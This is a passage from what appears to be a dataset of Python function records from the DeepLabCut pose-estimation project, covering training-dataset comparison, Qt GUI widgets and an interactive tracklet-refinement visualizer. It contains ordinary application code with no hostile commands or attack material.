    iterate = 'iteration-' + str(cfg['iteration'])
    dlc_model_path = os.path.join(project_path, 'dlc-models', iterate)
    if os.path.isdir(dlc_model_path):
        models = os.listdir(dlc_model_path)
        models.sort(key=lambda f: int(''.join(filter(str.isdigit, f))))
        max_shuffle_index = int(models[-1].split('shuffle')[-1]) + 1
    else:
        max_shuffle_index = 0
    return max_shuffle_index"
AlexEMG/DeepLabCut,create_training_model_comparison,"def create_training_model_comparison(config, trainindex=0, num_shuffles=1, net_types=['resnet_50'], augmenter_types=['imgaug'], userfeedback=False, windows2linux=False):
    """"""Creates a training dataset to compare networks and augmentation types.

    The datasets are created such that the shuffles have same training and testing
    indices. Therefore, this function is useful for benchmarking the performance of
    different network and augmentation types on the same training/testdata.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    trainindex: int, optional, default=0
        Either (in case uniform = True) indexes which element of TrainingFraction in
        the config file should be used (note it is a list!).
        Alternatively (uniform = False) indexes which folder is dropped, i.e. the first
        if trainindex=0, the second if trainindex=1, etc.

    num_shuffles : int, optional, default=1
        Number of shuffles of training dataset to create,
        i.e. [1,2,3] for num_shuffles=3.

    net_types: list[str], optional, default=[""resnet_50""]
        Currently supported networks are

        * ``""resnet_50""``
        * ``""resnet_101""``
        * ``""resnet_152""``
        * ``""mobilenet_v2_1.0""``
        * ``""mobilenet_v2_0.75""``
        * ``""mobilenet_v2_0.5""``
        * ``""mobilenet_v2_0.35""``
        * ``""efficientnet-b0""``
        * ``""efficientnet-b1""``
        * ``""efficientnet-b2""``
        * ``""efficientnet-b3""``
        * ``""efficientnet-b4""``
        * ``""efficientnet-b5""``
        * ``""efficientnet-b6""``

    augmenter_types: list[str], optional, default=[""imgaug""]
        Currently supported augmenters are

        * ``""default""``
        * ``""imgaug""``
        * ``""tensorpack""``
        * ``""deterministic""``

    userfeedback: bool, optional, default=False
        If ``False``, then all requested train/test splits are created, no matter if
        they already exist. If you want to assure that previous splits etc. are not
        overwritten, then set this to True and you will be asked for each split.

    windows2linux

        ..deprecated::
            Has no effect since 2.2.0.4 and will be removed in 2.2.1.

    Returns
    -------
    shuffle_list: list
        List of indices corresponding to the trainingsplits/models that were created.

    Examples
    --------
    On Linux/MacOS

    >>> shuffle_list = deeplabcut.create_training_model_comparison(
            '/analysis/project/reaching-task/config.yaml',
            num_shuffles=1,
            net_types=['resnet_50','resnet_152'],
            augmenter_types=['tensorpack','deterministic'],
        )

    On Windows

    >>> shuffle_list = deeplabcut.create_training_model_comparison(
            'C:\\Users\\Ulf\\looming-task\\config.yaml',
            num_shuffles=1,
            net_types=['resnet_50','resnet_152'],
            augmenter_types=['tensorpack','deterministic'],
        )

    See ``examples/testscript_openfielddata_augmentationcomparison.py`` for an example
    of how to use ``shuffle_list``.
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    if windows2linux:
        warnings.warn('`windows2linux` has no effect since 2.2.0.4 and will be removed in 2.2.1.', FutureWarning)
    log_file_name = os.path.join(cfg['project_path'], 'training_model_comparison.log')
    logger = logging.getLogger('training_model_comparison')
    if not logger.handlers:
        logger = logging.getLogger('training_model_comparison')
        hdlr = logging.FileHandler(log_file_name)
        formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
        hdlr.setFormatter(formatter)
        logger.addHandler(hdlr)
        logger.setLevel(logging.INFO)
    else:
        pass
    largestshuffleindex = get_largestshuffle_index(config)
    shuffle_list = []
    for shuffle in range(num_shuffles):
        (trainIndices, testIndices) = mergeandsplit(config, trainindex=trainindex, uniform=True)
        for (idx_net, net) in enumerate(net_types):
            for (idx_aug, aug) in enumerate(augmenter_types):
                get_max_shuffle_idx = largestshuffleindex + idx_aug + idx_net * len(augmenter_types) + shuffle * len(augmenter_types) * len(net_types)
                shuffle_list.append(get_max_shuffle_idx)
                log_info = str('Shuffle index:' + str(get_max_shuffle_idx) + ', net_type:' + net + ', augmenter_type:' + aug + ', trainsetindex:' + str(trainindex) + ', frozen shuffle ID:' + str(shuffle))
                create_training_dataset(config, Shuffles=[get_max_shuffle_idx], net_type=net, trainIndices=[trainIndices], testIndices=[testIndices], augmenter_type=aug, userfeedback=userfeedback)
                logger.info(log_info)
    return shuffle_list"
AlexEMG/DeepLabCut,to_matlab_cell,"def to_matlab_cell(array):
    outer = np.array([[None]], dtype=object)
    outer[0, 0] = array.astype('int64')
    return outer"
AlexEMG/DeepLabCut,_create_label_widget,"def _create_label_widget(text: str, style: str='', margins: tuple=(20, 10, 0, 10)) -> QtWidgets.QLabel:
    label = QtWidgets.QLabel(text)
    label.setContentsMargins(*margins)
    label.setStyleSheet(style)
    return label"
AlexEMG/DeepLabCut,_create_horizontal_layout,"def _create_horizontal_layout(alignment=None, spacing: int=20, margins: tuple=(20, 0, 0, 0)) -> QtWidgets.QHBoxLayout():
    layout = QtWidgets.QHBoxLayout()
    layout.setAlignment(Qt.AlignLeft | Qt.AlignTop)
    layout.setSpacing(spacing)
    layout.setContentsMargins(*margins)
    return layout"
AlexEMG/DeepLabCut,_create_vertical_layout,"def _create_vertical_layout(alignment=None, spacing: int=20, margins: tuple=(20, 0, 0, 0)) -> QtWidgets.QVBoxLayout():
    layout = QtWidgets.QVBoxLayout()
    layout.setAlignment(Qt.AlignLeft | Qt.AlignTop)
    layout.setSpacing(spacing)
    layout.setContentsMargins(*margins)
    return layout"
AlexEMG/DeepLabCut,_create_grid_layout,"def _create_grid_layout(alignment=None, spacing: int=20, margins: tuple=None) -> QtWidgets.QGridLayout():
    layout = QtWidgets.QGridLayout()
    layout.setAlignment(Qt.AlignLeft | Qt.AlignTop)
    layout.setSpacing(spacing)
    if margins:
        layout.setContentsMargins(*margins)
    return layout"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root: QtWidgets.QMainWindow, parent: QtWidgets.QWidget):
    super(BodypartListWidget, self).__init__()
    self.root = root
    self.parent = parent
    self.selected_bodyparts = self.root.all_bodyparts
    self.setEnabled(False)
    self.setMaximumWidth(600)
    self.setMaximumHeight(500)
    self.hide()
    self.addItems(self.root.all_bodyparts)
    self.setSelectionMode(QtWidgets.QAbstractItemView.MultiSelection)
    self.itemSelectionChanged.connect(self.update_selected_bodyparts)"
AlexEMG/DeepLabCut,update_selected_bodyparts,"def update_selected_bodyparts(self):
    self.selected_bodyparts = [item.text() for item in self.selectedItems()]
    self.root.logger.info(f'Selected bodyparts:\n\t{self.selected_bodyparts}')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root: QtWidgets.QMainWindow, parent: QtWidgets.QWidget):
    super(VideoSelectionWidget, self).__init__(parent)
    self.root = root
    self.parent = parent
    self._init_layout()"
AlexEMG/DeepLabCut,_init_layout,"def _init_layout(self):
    layout = _create_horizontal_layout()
    self.videotype_widget = QtWidgets.QComboBox()
    self.videotype_widget.setMinimumWidth(100)
    self.videotype_widget.addItems(DLCParams.VIDEOTYPES)
    self.videotype_widget.setCurrentText(self.root.video_type)
    self.root.video_type_.connect(self.videotype_widget.setCurrentText)
    self.videotype_widget.currentTextChanged.connect(self.update_videotype)
    self.select_video_button = QtWidgets.QPushButton('Select videos')
    self.select_video_button.setMaximumWidth(200)
    self.select_video_button.clicked.connect(self.select_videos)
    self.root.video_files_.connect(self._update_video_selection)
    self.selected_videos_text = QtWidgets.QLabel('')
    self.clear_videos = QtWidgets.QPushButton('Clear selection')
    self.clear_videos.clicked.connect(self.clear_selected_videos)
    layout.addWidget(self.videotype_widget)
    layout.addWidget(self.select_video_button)
    layout.addWidget(self.selected_videos_text)
    layout.addWidget(self.clear_videos, alignment=Qt.AlignRight)
    self.setLayout(layout)"
AlexEMG/DeepLabCut,files,"@property
def files(self):
    return self.root.video_files"
AlexEMG/DeepLabCut,update_videotype,"def update_videotype(self, vtype):
    self.clear_selected_videos()
    self.root.video_type = vtype"
AlexEMG/DeepLabCut,_update_video_selection,"def _update_video_selection(self, videopaths):
    n_videos = len(self.root.video_files)
    if n_videos:
        self.selected_videos_text.setText(f'{n_videos} videos selected')
        self.select_video_button.setText('Add more videos')
    else:
        self.selected_videos_text.setText('')
        self.select_video_button.setText('Select videos')"
AlexEMG/DeepLabCut,select_videos,"def select_videos(self):
    cwd = self.root.project_folder
    filenames = QtWidgets.QFileDialog.getOpenFileNames(self, 'Select video(s) to analyze', cwd, f""Videos ({' *.'.join(DLCParams.VIDEOTYPES)[1:]})"")
    if filenames[0]:
        self.root.video_files = [os.path.abspath(vid) for vid in filenames[0]]"
AlexEMG/DeepLabCut,clear_selected_videos,"def clear_selected_videos(self):
    self.root.video_files = set()
    self.root.logger.info(f'Cleared selected videos')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent):
    super(TrainingSetSpinBox, self).__init__(parent)
    self.root = root
    self.parent = parent
    self.setMaximum(100)
    self.setValue(self.root.trainingset_index)
    self.valueChanged.connect(self.root.update_trainingset)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root, parent):
    super(ShuffleSpinBox, self).__init__(parent)
    self.root = root
    self.parent = parent
    self.setMaximum(100)
    self.setValue(self.root.shuffle_value)
    self.valueChanged.connect(self.root.update_shuffle)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, root: QtWidgets.QMainWindow, parent: QtWidgets.QWidget=None, h1_description: str=''):
    super(DefaultTab, self).__init__(parent)
    self.parent = parent
    self.root = root
    self.h1_description = h1_description
    self.main_layout = QtWidgets.QVBoxLayout()
    self.main_layout.setAlignment(Qt.AlignLeft | Qt.AlignTop)
    self.setLayout(self.main_layout)
    self._init_default_layout()"
AlexEMG/DeepLabCut,_init_default_layout,"def _init_default_layout(self):
    self.main_layout.addWidget(_create_label_widget(self.h1_description, 'font:bold;', (10, 10, 0, 10)))
    self.separator = QtWidgets.QFrame()
    self.separator.setFrameShape(QtWidgets.QFrame.HLine)
    self.separator.setFrameShadow(QtWidgets.QFrame.Raised)
    self.separator.setLineWidth(0)
    self.separator.setMidLineWidth(1)
    policy = QtWidgets.QSizePolicy()
    policy.setVerticalPolicy(QtWidgets.QSizePolicy.Policy.Fixed)
    policy.setHorizontalPolicy(QtWidgets.QSizePolicy.Policy.MinimumExpanding)
    self.separator.setSizePolicy(policy)
    self.main_layout.addWidget(self.separator)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, button_label: str, filepath: str, parent: QtWidgets.QWidget=None):
    super(EditYamlButton, self).__init__(button_label)
    self.filepath = filepath
    self.parent = parent
    self.clicked.connect(self.open_config)"
AlexEMG/DeepLabCut,open_config,"def open_config(self):
    editor = ConfigEditor(self.filepath)
    editor.show()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, button_label: str, filetype: str=None, cwd: str=None, single_file: bool=False, dialog_text: str=None, file_text: str=None, parent=None):
    super(BrowseFilesButton, self).__init__(button_label)
    self.filetype = filetype
    self.single_file_only = single_file
    self.cwd = cwd
    self.parent = parent
    self.dialog_text = dialog_text
    self.file_text = file_text
    self.files = set()
    self.clicked.connect(self.browse_files)"
AlexEMG/DeepLabCut,browse_files,"def browse_files(self):
    file_ext = '*'
    if self.filetype:
        file_ext = self.filetype.split('.')[-1]
    open_file_func = QtWidgets.QFileDialog.getOpenFileNames
    if self.single_file_only:
        open_file_func = QtWidgets.QFileDialog.getOpenFileName
    cwd = ''
    if self.cwd:
        cwd = self.cwd
    dialog_text = f'Select .{file_ext} files'
    if self.dialog_text:
        dialog_text = self.dialog_text
    file_text = f'Files (*.{file_ext})'
    if self.file_text:
        file_text = self.file_text
    filepaths = open_file_func(self, dialog_text, cwd, file_text)
    if filepaths:
        self.files.update(filepaths[0])"
AlexEMG/DeepLabCut,launch_dlc,"def launch_dlc():
    app = QtWidgets.QApplication(sys.argv)
    app.setWindowIcon(QIcon(os.path.join(BASE_DIR, 'assets', 'logo.png')))
    screen_size = app.screens()[0].size()
    pixmap = QPixmap(os.path.join(BASE_DIR, 'assets', 'welcome.png')).scaledToWidth(int(0.7 * screen_size.width()), Qt.SmoothTransformation)
    splash = QtWidgets.QSplashScreen(pixmap)
    splash.show()
    stylefile = os.path.join(BASE_DIR, 'style.qss')
    with open(stylefile, 'r') as f:
        app.setStyleSheet(f.read())
    dark_stylesheet = qdarkstyle.load_stylesheet_pyside2()
    app.setStyleSheet(dark_stylesheet)
    from deeplabcut.gui.window import MainWindow
    window = MainWindow(app)
    window.receiver.start()
    window.showMaximized()
    splash.finish(window)
    sys.exit(app.exec_())"
AlexEMG/DeepLabCut,refine_tracklets,"def refine_tracklets(config, pickle_or_h5_file, video, min_swap_len=2, min_tracklet_len=2, max_gap=2, trail_len=0):
    """"""
    Refine tracklets stored either in pickle or h5 format.
    The procedure is done in two stages:
    (i) freshly-converted detections are read by the TrackletManager,
    which automatically attempts to optimize tracklet continuity by
    assigning higher priority to long tracks while maximizing
    keypoint likelihood;
    (ii) loaded tracklets are displayed into the TrackletVisualizer
    for manual editing. Individual labels can be dragged around
    like in the labeling toolbox; several of them can also be simultaneously
    selected using the Lasso tool in order to re-assign multiple tracks
    to another identity at once.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    pickle_or_h5_file: str
        Full path of either the pickle file obtained after calling
        deeplabcut.convert_detections2tracklets, or the h5 file written after
        refining the tracklets a first time. Note that refined tracklets are
        always stored in the h5 format.

    video: str
        Full path of the corresponding video.
        If the video duration and the total length of the tracklets disagree
        by more than 5%, a message is printed indicating that the selected
        video may not be the right one.

    min_swap_len : float, optional (default=2)
        Minimum swap length.
        Set to 2 by default. Retained swaps appear in the right panel in
        shaded regions.

    min_tracklet_len : float, optional (default=2)
        Minimum tracklet length.
        By default, tracklets shorter than 2 frames are discarded,
        leaving missing data instead. If set to 0, all tracklets are kept.

    max_gap : int, optional (default=2).
        Maximal gap size (in number of frames) of missing data to be filled.
        The procedure fits a cubic spline over all individual trajectories,
        and fills all gaps smaller than or equal to 2 frames by default.

    trail_len : int, optional (default=0)
        Number of trailing points. None by default, to accelerate visualization.
    """"""
    manager = TrackletManager(config, min_swap_len, min_tracklet_len, max_gap)
    if pickle_or_h5_file.endswith('pickle'):
        manager.load_tracklets_from_pickle(pickle_or_h5_file)
    else:
        manager.load_tracklets_from_hdf(pickle_or_h5_file)
    manager.find_swapping_bodypart_pairs()
    viz = TrackletVisualizer(manager, video, trail_len)
    viz.show()
    return (manager, viz)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, point, bodyParts, individual_names=None, likelihood=None):
    self.point = point
    self.bodyParts = bodyParts
    self.individual_names = individual_names
    self.likelihood = likelihood
    self.press = None
    self.background = None
    self.final_point = (0.0, 0.0)
    self.annot = self.point.axes.annotate('', xy=(0, 0), xytext=(20, 20), textcoords='offset points', bbox=dict(boxstyle='round', fc='w'), arrowprops=dict(arrowstyle='->'))
    self.annot.set_visible(False)
    self.coords = []"
AlexEMG/DeepLabCut,connect,"def connect(self):
    """"""connect to all the events we need""""""
    self.cidpress = self.point.figure.canvas.mpl_connect('button_press_event', self.on_press)
    self.cidrelease = self.point.figure.canvas.mpl_connect('button_release_event', self.on_release)
    self.cidmotion = self.point.figure.canvas.mpl_connect('motion_notify_event', self.on_motion)
    self.cidhover = self.point.figure.canvas.mpl_connect('motion_notify_event', self.on_hover)"
AlexEMG/DeepLabCut,on_press,"def on_press(self, event):
    """"""
        Define the event for the button press!
        """"""
    if event.inaxes != self.point.axes:
        return
    if DraggablePoint.lock is not None:
        return
    (contains, attrd) = self.point.contains(event)
    if not contains:
        return
    if event.button == 1:
        '\n            This button press corresponds to the left click\n            '
        self.press = (self.point.center, event.xdata, event.ydata)
        DraggablePoint.lock = self
        canvas = self.point.figure.canvas
        axes = self.point.axes
        self.point.set_animated(True)
        canvas.draw()
        self.background = canvas.copy_from_bbox(self.point.axes.bbox)
        axes.draw_artist(self.point)
        canvas.blit(axes.bbox)
    elif event.button == 2:
        '\n            To remove a predicted label. Internally, the coordinates of the selected predicted label is replaced with nan. The user needs to middle click for the event. After right\n            click the data point is removed from the plot.\n            '
        message = f'Do you want to remove the label {self.bodyParts}?'
        if self.likelihood is not None:
            message += ' You cannot undo this step!'
        msg = QMessageBox()
        msg.setWindowTitle('Warning!')
        msg.setText(message)
        msg.setStandardButtons(msg.Yes | msg.No)
        if msg.exec() == msg.Yes:
            self.delete_data()"
AlexEMG/DeepLabCut,delete_data,"def delete_data(self):
    self.press = None
    DraggablePoint.lock = None
    self.point.set_animated(False)
    self.background = None
    self.final_point = (np.nan, np.nan, self.individual_names, self.bodyParts)
    self.point.center = (np.nan, np.nan)
    self.coords.append(self.final_point)
    self.point.figure.canvas.draw()"
AlexEMG/DeepLabCut,on_motion,"def on_motion(self, event):
    """"""
        During the drag!
        """"""
    if DraggablePoint.lock is not self:
        return
    if event.inaxes != self.point.axes:
        return
    if event.button == 1:
        (self.point.center, xpress, ypress) = self.press
        dx = event.xdata - xpress
        dy = event.ydata - ypress
        self.point.center = (self.point.center[0] + dx, self.point.center[1] + dy)
        canvas = self.point.figure.canvas
        axes = self.point.axes
        canvas.restore_region(self.background)
        axes.draw_artist(self.point)
        canvas.blit(axes.bbox)"
AlexEMG/DeepLabCut,on_release,"def on_release(self, event):
    """"""on release we reset the press data""""""
    if DraggablePoint.lock is not self:
        return
    if event.button == 1:
        self.press = None
        DraggablePoint.lock = None
        self.point.set_animated(False)
        self.background = None
        self.point.figure.canvas.draw()
        self.final_point = (self.point.center[0], self.point.center[1], self.individual_names, self.bodyParts)
        self.coords.append(self.final_point)"
AlexEMG/DeepLabCut,on_hover,"def on_hover(self, event):
    """"""
        Annotate the labels and likelihood when the user hovers over the data points.
        """"""
    vis = self.annot.get_visible()
    if event.inaxes == self.point.axes:
        (contains, attrd) = self.point.contains(event)
        if contains:
            self.annot.xy = (self.point.center[0], self.point.center[1])
            text = str(self.bodyParts)
            if self.individual_names is not None:
                text = f'{self.individual_names},{text}'
            if self.likelihood is not None:
                text += f',p={self.likelihood:.2f}'
            self.annot.set_text(text)
            self.annot.get_bbox_patch().set_alpha(0.4)
            self.annot.set_visible(True)
            self.point.figure.canvas.draw_idle()
        elif vis:
            self.annot.set_visible(False)"
AlexEMG/DeepLabCut,disconnect,"def disconnect(self):
    """"""disconnect all the stored connection ids""""""
    self.point.figure.canvas.mpl_disconnect(self.cidpress)
    self.point.figure.canvas.mpl_disconnect(self.cidrelease)
    self.point.figure.canvas.mpl_disconnect(self.cidmotion)
    self.point.figure.canvas.mpl_disconnect(self.cidhover)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, viz):
    self.viz = viz
    self.can_run = Event()
    self.can_run.clear()
    self.running = True
    self.paused = True
    self.speed = 'F'"
AlexEMG/DeepLabCut,run,"def run(self):
    while self.running:
        self.can_run.wait()
        i = self.viz.curr_frame
        if 'F' in self.speed:
            if len(self.speed) == 1:
                i += 1
            else:
                i += 2 * (len(self.speed) - 1)
        elif 'R' in self.speed:
            if len(self.speed) == 1:
                i -= 1
            else:
                i -= 2 * (len(self.speed) - 1)
        if i >= self.viz.manager.nframes:
            i = 0
        elif i < 0:
            i = self.viz.manager.nframes - 1
        self.viz.slider.set_val(i)"
AlexEMG/DeepLabCut,pause,"def pause(self):
    self.can_run.clear()
    self.paused = True"
AlexEMG/DeepLabCut,resume,"def resume(self):
    self.can_run.set()
    self.paused = False"
AlexEMG/DeepLabCut,toggle,"def toggle(self):
    if self.paused:
        self.resume()
    else:
        self.pause()"
AlexEMG/DeepLabCut,forward,"def forward(self):
    speed = self.speed
    if 'R' in speed:
        speed = 'F'
    elif len(speed) < 5:
        speed += 'F'
    elif len(speed) == 5:
        speed = 'F'
    print(speed)
    self.speed = speed
    self.resume()"
AlexEMG/DeepLabCut,rewind,"def rewind(self):
    speed = self.speed
    if 'F' in speed:
        speed = 'R'
    elif len(speed) < 5:
        speed += 'R'
    elif len(speed) == 5:
        speed = 'R'
    print(speed)
    self.speed = speed
    self.resume()"
AlexEMG/DeepLabCut,terminate,"def terminate(self, *args):
    self.can_run.set()
    self.running = False"
AlexEMG/DeepLabCut,__init__,"def __init__(self, tracker, ax, collection, alpha, alpha_other=0.2):
    self.tracker = tracker
    self.ax = ax
    self.collection = collection
    self.fc = collection.get_facecolors()
    self.alpha = alpha
    self.alpha_other = alpha_other
    self.lasso = LassoSelector(ax, onselect=self.on_select)
    self.is_connected = True
    self.toggle()"
AlexEMG/DeepLabCut,on_select,"def on_select(self, verts):
    path = Path(verts)
    xy = self.collection.get_offsets()
    self.tracker.picked = list(np.nonzero(path.contains_points(xy))[0])
    self.fc[:, -1] = self.alpha_other
    self.fc[self.tracker.picked, -1] = self.alpha
    self.collection.set_color(self.fc)
    self.tracker.display_traces()
    self.tracker.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,toggle,"def toggle(self, *args):
    if self.is_connected:
        self.disconnect()
    else:
        self.reconnect()"
AlexEMG/DeepLabCut,disconnect,"def disconnect(self):
    self.lasso.disconnect_events()
    self.is_connected = False
    self.tracker.picked = []
    self.tracker.picked_pair = []
    self.fc[:, -1] = self.alpha
    self.collection.set_color(self.fc)
    self.tracker.display_traces(only_picked=False)
    self.tracker.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,reconnect,"def reconnect(self):
    self.lasso.connect_default_events()
    self.is_connected = True"
AlexEMG/DeepLabCut,__init__,"def __init__(self, manager, videoname, trail_len=50):
    self.manager = manager
    self.cmap = plt.cm.get_cmap(manager.cfg['colormap'], len(set(manager.tracklet2id)))
    self.videoname = videoname
    self.video = VideoReader(videoname)
    self.nframes = len(self.video)
    if abs(self.nframes - manager.nframes) >= 0.05 * manager.nframes:
        print('Video duration and data length do not match. Continuing nonetheless...')
    self.trail_len = trail_len
    self.help_text = ''
    self.draggable = False
    self._curr_frame = 0
    self.curr_frame = 0
    self.picked = []
    self.picked_pair = []
    self.cuts = []
    self.mutex = QMutex()
    self.player = BackgroundPlayer(self)
    (self.worker, self.thread_player) = move_to_separate_thread(self.player.run)
    self.thread_player.start()
    self.dps = []"
AlexEMG/DeepLabCut,_prepare_canvas,"def _prepare_canvas(self, manager, fig):
    params = {'keymap.save': 's', 'keymap.back': 'left', 'keymap.forward': 'right', 'keymap.yscale': 'l'}
    for (k, v) in params.items():
        if v in plt.rcParams[k]:
            plt.rcParams[k].remove(v)
    self.dotsize = manager.cfg['dotsize']
    self.alpha = manager.cfg['alphavalue']
    if fig is None:
        self.fig = plt.figure(figsize=(13, 8))
    else:
        self.fig = fig
    gs = self.fig.add_gridspec(2, 2)
    self.ax1 = self.fig.add_subplot(gs[:, 0])
    self.ax2 = self.fig.add_subplot(gs[0, 1])
    self.ax3 = self.fig.add_subplot(gs[1, 1], sharex=self.ax2)
    plt.subplots_adjust(bottom=0.2)
    for ax in (self.ax1, self.ax2, self.ax3):
        ax.axis('off')
    self.colors = self.cmap(manager.tracklet2id)
    self.colors[:, -1] = self.alpha
    img = self.video.read_frame()
    self.im = self.ax1.imshow(img)
    self.scat = self.ax1.scatter([], [], s=self.dotsize ** 2, picker=True)
    self.scat.set_offsets(manager.xy[:, 0])
    self.scat.set_color(self.colors)
    self.trails = sum([self.ax1.plot([], [], '-', lw=2, c=c) for c in self.colors], [])
    self.lines_x = sum([self.ax2.plot([], [], '-', lw=1, c=c, pickradius=5) for c in self.colors], [])
    self.lines_y = sum([self.ax3.plot([], [], '-', lw=1, c=c, pickradius=5) for c in self.colors], [])
    self.vline_x = self.ax2.axvline(0, 0, 1, c='k', ls=':')
    self.vline_y = self.ax3.axvline(0, 0, 1, c='k', ls=':')
    custom_lines = [plt.Line2D([0], [0], color=self.cmap(i), lw=4) for i in range(len(manager.individuals))]
    self.leg = self.fig.legend(custom_lines, manager.individuals, frameon=False, fancybox=None, ncol=len(manager.individuals), fontsize='small', bbox_to_anchor=(0, 0.9, 1, 0.1), loc='center')
    for line in self.leg.get_lines():
        line.set_picker(5)
    self.ax_slider = self.fig.add_axes([0.1, 0.1, 0.5, 0.03], facecolor='lightgray')
    self.ax_slider2 = self.fig.add_axes([0.1, 0.05, 0.3, 0.03], facecolor='darkorange')
    self.slider = Slider(self.ax_slider, '# Frame', self.curr_frame, manager.nframes - 1, valinit=0, valstep=1, valfmt='%i')
    self.slider.on_changed(self.on_change)
    self.slider2 = Slider(self.ax_slider2, 'Marker size', 1, 30, valinit=self.dotsize, valstep=1, valfmt='%i')
    self.slider2.on_changed(self.update_dotsize)
    self.ax_drag = self.fig.add_axes([0.65, 0.1, 0.05, 0.03])
    self.ax_lasso = self.fig.add_axes([0.7, 0.1, 0.05, 0.03])
    self.ax_flag = self.fig.add_axes([0.75, 0.1, 0.05, 0.03])
    self.ax_save = self.fig.add_axes([0.8, 0.1, 0.05, 0.03])
    self.ax_help = self.fig.add_axes([0.85, 0.1, 0.05, 0.03])
    self.save_button = Button(self.ax_save, 'Save', color='darkorange')
    self.save_button.on_clicked(self.save)
    self.help_button = Button(self.ax_help, 'Help')
    self.help_button.on_clicked(self.display_help)
    self.drag_toggle = CheckButtons(self.ax_drag, ['Drag'])
    self.drag_toggle.on_clicked(self.toggle_draggable_points)
    self.flag_button = Button(self.ax_flag, 'Flag')
    self.flag_button.on_clicked(self.flag_frame)
    self.fig.canvas.mpl_connect('pick_event', self.on_pick)
    self.fig.canvas.mpl_connect('key_press_event', self.on_press)
    self.fig.canvas.mpl_connect('button_press_event', self.on_click)
    self.fig.canvas.mpl_connect('close_event', self.player.terminate)
    self.selector = PointSelector(self, self.ax1, self.scat, self.alpha)
    self.lasso_toggle = CheckButtons(self.ax_lasso, ['Lasso'])
    self.lasso_toggle.on_clicked(self.selector.toggle)
    self.display_traces(only_picked=False)
    self.ax1_background = self.fig.canvas.copy_from_bbox(self.ax1.bbox)
    self.fig.show()"
AlexEMG/DeepLabCut,show,"def show(self, fig=None):
    self._prepare_canvas(self.manager, fig)"
AlexEMG/DeepLabCut,fill_shaded_areas,"def fill_shaded_areas(self):
    self.clean_collections()
    if self.picked_pair:
        mask = self.manager.get_nonoverlapping_segments(*self.picked_pair)
        for ax in (self.ax2, self.ax3):
            ax.fill_between(self.manager.times, *ax.dataLim.intervaly, mask, facecolor='darkgray', alpha=0.2)
        trans = mtransforms.blended_transform_factory(self.ax_slider.transData, self.ax_slider.transAxes)
        self.ax_slider.vlines(np.flatnonzero(mask), 0, 0.5, color='darkorange', transform=trans)"
AlexEMG/DeepLabCut,toggle_draggable_points,"def toggle_draggable_points(self, *args):
    self.draggable = not self.draggable
    if self.draggable:
        self._curr_frame = self.curr_frame
        self.scat.set_offsets(np.empty((0, 2)))
        self.add_draggable_points()
    else:
        self.save_coords()
        self.clean_points()
        self.display_points(self._curr_frame)
    self.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,add_point,"def add_point(self, center, animal, bodypart, **kwargs):
    circle = patches.Circle(center, **kwargs)
    self.ax1.add_patch(circle)
    dp = DraggablePoint(circle, bodypart, animal)
    dp.connect()
    self.dps.append(dp)"
AlexEMG/DeepLabCut,clean_points,"def clean_points(self):
    for dp in self.dps:
        dp.annot.set_visible(False)
        dp.disconnect()
    self.dps = []
    for patch in self.ax1.patches[::-1]:
        patch.remove()"
AlexEMG/DeepLabCut,add_draggable_points,"def add_draggable_points(self):
    self.clean_points()
    (xy, _, inds) = self.manager.get_non_nan_elements(self.curr_frame)
    for (i, (animal, bodypart)) in enumerate(self.manager._label_pairs):
        if i in inds:
            coords = xy[inds == i].squeeze()
            self.add_point(coords, animal, bodypart, radius=self.dotsize, fc=self.colors[i], alpha=self.alpha)"
AlexEMG/DeepLabCut,save_coords,"def save_coords(self):
    (coords, nonempty, inds) = self.manager.get_non_nan_elements(self._curr_frame)
    if not inds.size:
        return
    prob = self.manager.prob[:, self._curr_frame]
    for dp in self.dps:
        label = (dp.individual_names, dp.bodyParts)
        ind = self.manager._label_pairs.index(label)
        nrow = np.flatnonzero(inds == ind)
        if not nrow.size:
            return
        nrow = nrow[0]
        if not np.array_equal(coords[nrow], dp.point.center):
            coords[nrow] = dp.point.center
            prob[ind] = 1
    self.manager.xy[nonempty, self._curr_frame] = coords"
AlexEMG/DeepLabCut,flag_frame,"def flag_frame(self, *args):
    self.cuts.append(self.curr_frame)
    self.ax_slider.axvline(self.curr_frame, color='r')
    if len(self.cuts) == 2:
        self.cuts.sort()
        mask = np.zeros_like(self.manager.times, dtype=bool)
        mask[self.cuts[0]:self.cuts[1] + 1] = True
        for ax in (self.ax2, self.ax3):
            ax.fill_between(self.manager.times, *ax.dataLim.intervaly, mask, facecolor='darkgray', alpha=0.2)
        trans = mtransforms.blended_transform_factory(self.ax_slider.transData, self.ax_slider.transAxes)
        self.ax_slider.vlines(np.flatnonzero(mask), 0, 0.5, color='darkorange', transform=trans)
    self.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,on_scroll,"def on_scroll(self, event):
    cur_xlim = self.ax1.get_xlim()
    cur_ylim = self.ax1.get_ylim()
    xdata = event.xdata
    ydata = event.ydata
    if event.button == 'up':
        scale_factor = 0.5
    elif event.button == 'down':
        scale_factor = 2
    else:
        scale_factor = 1
    self.ax1.set_xlim([xdata - (xdata - cur_xlim[0]) / scale_factor, xdata + (cur_xlim[1] - xdata) / scale_factor])
    self.ax1.set_ylim([ydata - (ydata - cur_ylim[0]) / scale_factor, ydata + (cur_ylim[1] - ydata) / scale_factor])
    self.fig.canvas.draw()"
AlexEMG/DeepLabCut,on_press,"def on_press(self, event):
    if event.key == 'n' or event.key == 'right':
        self.move_forward()
    elif event.key == 'b' or event.key == 'left':
        self.move_backward()
    elif event.key == 's':
        self.swap()
    elif event.key == 'i':
        self.invert()
    elif event.key == 'x':
        self.flag_frame()
        if len(self.cuts) > 1:
            self.cuts.sort()
            if self.picked_pair:
                self.manager.tracklet_swaps[self.picked_pair][self.cuts] = ~self.manager.tracklet_swaps[self.picked_pair][self.cuts]
                self.fill_shaded_areas()
